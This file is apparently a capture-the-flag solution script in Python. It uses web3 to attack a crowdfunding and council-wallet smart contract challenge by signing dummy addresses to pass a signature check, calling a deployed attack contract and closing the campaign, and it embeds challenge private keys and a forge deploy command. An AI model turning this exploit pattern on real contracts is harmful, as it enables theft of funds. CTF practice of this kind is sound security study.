from web3 import Web3
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files
from eth_account import Account
import hashlib

'''
Private key           :  0x86104e6d7049f844bcfcbb95d21521e5851f54d4b32a67e1cd22fde53529de2c
Address               :  0x8167c65Ef79E5b17E8FF747119F8F47bc7b0EAdB
Crowdfunding contract :  0x7eb0803195b4686A8cADFdA14121E286Bde6a76A
Wallet contract       :  0x029Cd7789476B9560CDfd6AD793Dc8ef31a70246
Setup contract        :  0x19B3cB206db98e51134687ee96407FF9A5f0223d
'''

x = {
    "PrivateKey":    "0x86104e6d7049f844bcfcbb95d21521e5851f54d4b32a67e1cd22fde53529de2c",
    "Address":       "0x8167c65Ef79E5b17E8FF747119F8F47bc7b0EAdB",
    "TargetAddress": "0x7eb0803195b4686A8cADFdA14121E286Bde6a76A",
    "WalletAddress": "0x029Cd7789476B9560CDfd6AD793Dc8ef31a70246",
    "setupAddress":  "0x19B3cB206db98e51134687ee96407FF9A5f0223d"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]
WalletContract = x["WalletAddress"]

#Attack Contract address
Target2Contract = "0x3477a17F7174B1053b344403615d289b2BE63f5d"

url = 'http://157.245.39.76:32639'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)
block = w3.eth.get_block(block_number)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

install_solc("0.8.18")
signatures = []
addresses = ["0x0000000000000000000000000000000000000001","0x0000000000000000000000000000000000000002","0x0000000000000000000000000000000000000003","0x0000000000000000000000000000000000000004","0x0000000000000000000000000000000000000005","0x0000000000000000000000000000000000000006","0x0000000000000000000000000000000000000007","0x0000000000000000000000000000000000000008","0x0000000000000000000000000000000000000009"]

for address in addresses:
	data_to_sign = w3.keccak(text=address).hex()
	account = Account.from_key(PrivateKey)
	signature = account.signHash(data_to_sign).signature
	signatures.append(signature)
print(signatures)

compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.8.18")
abi = compiled['Contract.sol:Contract']['abi']
contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
number = contract_instance2.functions.attack2().call()
print(number)

exit(0)
compiled = compile_files(["Campaign.sol"], output_values=["abi"], solc_version="0.8.18")
abi = compiled['Campaign.sol:CouncilWallet']['abi']
contract_instance2 = w3.eth.contract(address=WalletContract, abi=abi)

construct_txn = contract_instance2.functions.closeCampaign(signatures, Address, TargetContract).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.18")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
#


'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x855ad55752bCE030B8D8875d671494eE3F51B1e7
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
